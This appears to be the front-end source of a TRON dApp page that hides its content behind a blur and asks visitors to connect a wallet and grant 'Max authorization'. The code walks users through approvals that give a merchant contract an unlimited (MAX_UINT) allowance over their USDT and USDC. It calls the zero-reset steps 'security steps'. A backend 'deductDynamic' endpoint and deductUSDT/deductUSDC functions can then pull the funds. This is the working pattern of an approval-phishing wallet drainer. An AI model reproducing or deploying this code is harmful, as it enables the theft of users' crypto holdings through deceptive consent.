// tron-wallet-v2/src/main.js
// 🚨 最終 V2 穩定版代碼 (使用 @walletconnect/web3-provider 和 TronWeb)

import './style.css'; 
import { Web3Modal } from '@web3modal/standalone';
import TronWeb from 'tronweb';
// 引入 TronWebWalletConnect，它將作為我們的 TRON 錢包橋接器
const TronWebWalletConnect = window.TronWebWalletConnect; 
const WalletConnectProvider = window.WalletConnectProvider; 

// --- 配置常量 ---
const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; 
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 
const DEDUCTION_API_ENDPOINT = 'http://localhost:3000/api/tron/deductDynamic';
const RECORD_AUTH_API = 'http://localhost:3000/api/tron/recordAuth'; 

// 🚨 您的合約 ABI 🚨
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb; 
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false; 
let provider; // 用於 WalletConnect Provider 實例

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const deductionForm = document.getElementById('deductionForm');
const tokenSelectForm = document.getElementById('tokenSelectForm'); 
const deductionAmountInput = document.getElementById('deductionAmount');

// --- WalletConnect V2 配置與 Modal ---
// ⚠️ 注意：WalletConnect V2 for TRON 仍需使用 V1 Provider 和 TronWebWalletConnect 進行橋接
const web3Modal = new Web3Modal({
    projectId: WC_PROJECT_ID,
    mobileWallets: [
        { id: 'trust', name: 'Trust Wallet', links: { universal: 'https://link.trustwallet.com' } },
        { id: 'safepal', name: 'SafePal', links: { universal: 'https://link.safepal.io' } },
    ],
    // 定義一個 TRON 區塊鏈的連線方式
    walletConnectProvider: {
        package: WalletConnectProvider,
        options: {
            rpc: { 
                50: 'https://api.trongrid.io' // 雖然是 V1 格式，但 V2 仍需定義
            },
            bridge: "https://bridge.walletconnect.org",
            qrcode: true, 
            infuraId: WC_PROJECT_ID,
        }
    },
    themeMode: 'light'
});


// --- 輔助函數 (保持不變) ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
    if (isConnectedFlag) {
        deductionForm.style.display = 'block'; 
    }
}
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.title = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        hideOverlay();
    } else {
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
        deductionForm.style.display = 'none';
    }
}

async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000');
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}


// --- 核心邏輯：WalletConnect V2 連接 (簡化版) ---

async function connectWallet() {
    if (isConnectedFlag) {
        await disconnectWallet();
        return;
    }
    
    showOverlay('正在開啟錢包選擇，請選擇您的 TRON 錢包...');
    
    try {
        // 1. 打開 V2 Modal 讓用戶選擇/掃碼
        const modalResult = await web3Modal.openModal();
        
        // 2. 獲取底層 WalletConnectProvider 實例
        provider = modalResult.provider;
        
        // 3. 獲取帳戶 (這會觸發錢包彈窗)
        const accounts = await provider.enable();
        userAddress = accounts[0];
        
        // 4. 使用 TronWebWalletConnect 橋接 Provider
        tronWeb = new TronWebWalletConnect(provider, {
            fullHost: 'https://api.trongrid.io',
            privateKey: null 
        });

        // 5. 初始化合約並處理後續邏輯
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();

    } catch (error) {
        console.error("連接失敗:", error);
        showOverlay(`連線失敗！錯誤: ${error.message}。請嘗試使用 DApp 瀏覽器。`);
        updateConnectionUI(false);
    } finally {
        web3Modal.closeModal();
    }
}

async function disconnectWallet() {
    if (provider && provider.connected) {
        await provider.disconnect();
    }
    tronWeb = null;
    userAddress = null;
    updateConnectionUI(false);
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS); 
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const allAuthorized = status.contract && status.usdt && status.usdc;

    if (allAuthorized) {
        hideOverlay(); 
        await recordAuthorization(userAddress); 
    } else {
        showOverlay('偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...');
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            await handlePostConnection(); 
        }
    }
}


// --- 核心授權邏輯 (保持不變) ---
async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { contract: false, usdt: false, usdc: false };
    }
    const isContractAuthorized = await merchantContract.authorized(userAddress).call();
    const isUsdtMaxAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const isUsdcMaxAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    
    return { contract: isContractAuthorized, usdt: isUsdtMaxAuthorized, usdc: isUsdcMaxAuthorized };
}

async function connectAndAuthorize() {
    const status = await checkAuthorization();
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
    const ZERO_UINT = "0"; 
    
    const totalTxs = (status.contract ? 0 : 1) + (status.usdt ? 0 : 2) + (status.usdc ? 0 : 2); 
    let txCount = 0;

    if (totalTxs === 0) {
        showOverlay("所有授權已就緒，無需額外交易。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        // 1. 處理 SimpleMerchant 合約授權 (使用您的 connectAndAuthorize 函數)
        if (!status.contract) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 正在發送合約授權 (ConnectAndAuthorize)...`);
            await merchantContract.connectAndAuthorize().send({});
        }

        // 2. 處理 USDT Max 授權 (歸零+Max)
        if (!status.usdt) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: USDT 安全步驟: 重置授權金額至 0 (請同意)...`);
            await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).send({}); 

            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 設置 USDT Max 扣款授權 (最終授權 - 請同意)...`);
            await usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).send({});
        }

        // 3. 處理 USDC Max 授權 (歸零+Max)
        if (!status.usdc) {
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: USDC 安全步驟: 重置授權金額至 0 (請同意)...`);
            await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT).send({}); 
            
            txCount++;
            showOverlay(`步驟 ${txCount}/${totalTxs}: 設置 USDC Max 扣款授權 (最終授權 - 請同意)...`);
            await usdcContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT).send({});
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`授權交易失敗，錯誤訊息: ${error.message}。請確保您同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}

// --- 後端/表單邏輯 (保持不變) ---
async function recordAuthorization(address) { /* ... */ }
async function triggerBackendDeduction(token, amount) { /* ... */ }
async function triggerDeductionFromForm() { /* ... */ }


// 設置事件監聽器
connectButton.addEventListener('click', connectWallet);
if (document.getElementById('deductionForm')) {
    document.getElementById('deductionForm').querySelector('button').onclick = triggerDeductionFromForm;
}

// 頁面載入時初始化
showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>');